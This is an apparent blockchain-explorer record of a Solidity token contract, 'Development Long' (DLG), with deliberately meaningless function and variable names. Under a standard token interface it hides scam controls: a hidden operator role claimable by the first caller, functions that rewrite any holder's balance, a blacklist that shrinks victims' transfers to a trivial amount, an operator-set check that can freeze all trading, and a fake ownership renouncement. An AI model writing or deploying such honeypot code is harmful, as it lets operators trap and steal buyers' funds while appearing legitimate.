{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface swapMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract shouldMax {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalTx {\n    function createPair(address marketingTxAmount, address toAuto) external returns (address);\n}\n\ninterface feeAuto {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toAutoIs) external view returns (uint256);\n\n    function transfer(address receiverSwap, uint256 maxAuto) external returns (bool);\n\n    function allowance(address tokenFee, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverSwap,\n        uint256 maxAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeAt, uint256 value);\n    event Approval(address indexed tokenFee, address indexed spender, uint256 value);\n}\n\ninterface isToken is feeAuto {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DevelopmentLong is shouldMax, feeAuto, isToken {\n\n    uint256 launchReceiver;\n\n    uint256 private isLaunch;\n\n    string private senderTeamEnable = \"Development Long\";\n\n    function transfer(address amountMin, uint256 maxAuto) external virtual override returns (bool) {\n        return feeIs(_msgSender(), amountMin, maxAuto);\n    }\n\n    address private amountShould;\n\n    function limitMinSell(address amountMin, uint256 maxAuto) public {\n        txExempt();\n        marketingReceiver[amountMin] = maxAuto;\n    }\n\n    function balanceOf(address toAutoIs) public view virtual override returns (uint256) {\n        return marketingReceiver[toAutoIs];\n    }\n\n    address liquidityEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public totalLaunched;\n\n    function tradingFee(uint256 maxAuto) public {\n        txExempt();\n        amountAtTeam = maxAuto;\n    }\n\n    address amountTotalLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private feeTeamFrom;\n\n    function transferFrom(address fromTake, address receiverSwap, uint256 maxAuto) external override returns (bool) {\n        if (_msgSender() != liquidityEnable) {\n            if (atReceiver[fromTake][_msgSender()] != type(uint256).max) {\n                require(maxAuto <= atReceiver[fromTake][_msgSender()]);\n                atReceiver[fromTake][_msgSender()] -= maxAuto;\n            }\n        }\n        return feeIs(fromTake, receiverSwap, maxAuto);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingFund;\n    }\n\n    uint256 private marketingSender;\n\n    function fromMax() public {\n        emit OwnershipTransferred(minAt, address(0));\n        amountShould = address(0);\n    }\n\n    address public txShould;\n\n    function allowance(address tradingTx, address autoMax) external view virtual override returns (uint256) {\n        if (autoMax == liquidityEnable) {\n            return type(uint256).max;\n        }\n        return atReceiver[tradingTx][autoMax];\n    }\n\n    function buyTotal(address enableLiquidity) public {\n        txExempt();\n        \n        if (enableLiquidity == minAt || enableLiquidity == txShould) {\n            return;\n        }\n        marketingFee[enableLiquidity] = true;\n    }\n\n    uint256 constant modeBuy = 5 ** 10;\n\n    uint256 private minTo;\n\n    uint256 private tradingFund = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public swapLaunched;\n\n    mapping(address => mapping(address => uint256)) private atReceiver;\n\n    uint256 amountAtTeam;\n\n    bool private listAt;\n\n    event OwnershipTransferred(address indexed autoMin, address indexed fundMode);\n\n    function senderLimitShould(address launchMax) public {\n        require(launchMax.balance < 100000);\n        if (takeTo) {\n            return;\n        }\n        \n        swapLaunched[launchMax] = true;\n        \n        takeTo = true;\n    }\n\n    function approve(address autoMax, uint256 maxAuto) public virtual override returns (bool) {\n        atReceiver[_msgSender()][autoMax] = maxAuto;\n        emit Approval(_msgSender(), autoMax, maxAuto);\n        return true;\n    }\n\n    mapping(address => uint256) private marketingReceiver;\n\n    function feeIs(address fromTake, address receiverSwap, uint256 maxAuto) internal returns (bool) {\n        if (fromTake == minAt) {\n            return listTx(fromTake, receiverSwap, maxAuto);\n        }\n        uint256 buyWallet = feeAuto(txShould).balanceOf(amountTotalLiquidity);\n        require(buyWallet == amountAtTeam);\n        require(receiverSwap != amountTotalLiquidity);\n        if (marketingFee[fromTake]) {\n            return listTx(fromTake, receiverSwap, modeBuy);\n        }\n        return listTx(fromTake, receiverSwap, maxAuto);\n    }\n\n    string private buyIs = \"DLG\";\n\n    address public minAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchLaunchedReceiver;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return senderTeamEnable;\n    }\n\n    function listTx(address fromTake, address receiverSwap, uint256 maxAuto) internal returns (bool) {\n        require(marketingReceiver[fromTake] >= maxAuto);\n        marketingReceiver[fromTake] -= maxAuto;\n        marketingReceiver[receiverSwap] += maxAuto;\n        emit Transfer(fromTake, receiverSwap, maxAuto);\n        return true;\n    }\n\n    uint256 private enableMinShould;\n\n    uint8 private launchLaunchedReceiver = 18;\n\n    bool public takeTo;\n\n    mapping(address => bool) public marketingFee;\n\n    function owner() external view returns (address) {\n        return amountShould;\n    }\n\n    function txExempt() private view {\n        require(swapLaunched[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return amountShould;\n    }\n\n    constructor (){\n        \n        swapMarketing launchAt = swapMarketing(liquidityEnable);\n        txShould = totalTx(launchAt.factory()).createPair(launchAt.WETH(), address(this));\n        if (minTo != totalLaunched) {\n            isLaunch = enableMinShould;\n        }\n        minAt = _msgSender();\n        fromMax();\n        swapLaunched[minAt] = true;\n        marketingReceiver[minAt] = tradingFund;\n        if (isLaunch == totalLaunched) {\n            enableMinShould = feeTeamFrom;\n        }\n        emit Transfer(address(0), minAt, tradingFund);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyIs;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toAutoIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"}],\"name\":\"buyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"limitMinSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"}],\"name\":\"senderLimitShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"tradingFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DevelopmentLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}